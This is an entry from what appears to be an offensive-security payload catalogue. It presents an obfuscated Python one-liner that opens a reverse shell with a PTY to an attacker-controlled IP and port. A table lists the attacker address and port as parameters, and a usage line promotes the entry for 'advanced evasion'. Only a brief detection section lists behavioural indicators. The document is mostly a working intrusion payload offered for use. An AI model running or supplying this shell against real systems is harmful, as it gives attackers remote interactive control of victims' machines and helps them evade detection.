---
id: 3571f1bb-c3a6-4703-abf0-1b58c16a0e9f
type: code
language: Python
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - reverse-shell
  - python
  - obfuscated
  - pty
validated: true
---

# Python-Short-Obfuscated-Reverse-Shell-PTY

## Code

```python
python -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("10.0.0.1",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```

## Description

Highly compacted obfuscation using single-letter variables and __import__ aliases for PTY shell.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IP | Attacker's IPv4 address | 10.0.0.1 |
| $_ATTACKER_PORT | Attacker's listening port | 4242 |

## Usage

Advanced evasion; shorter for command-line limits.

## Detection

- Shortened variable obfuscation in Python.
- Behavioral socket + pty indicators.

## Related

- [[procedures/Establish-Python-Reverse-Shell]]
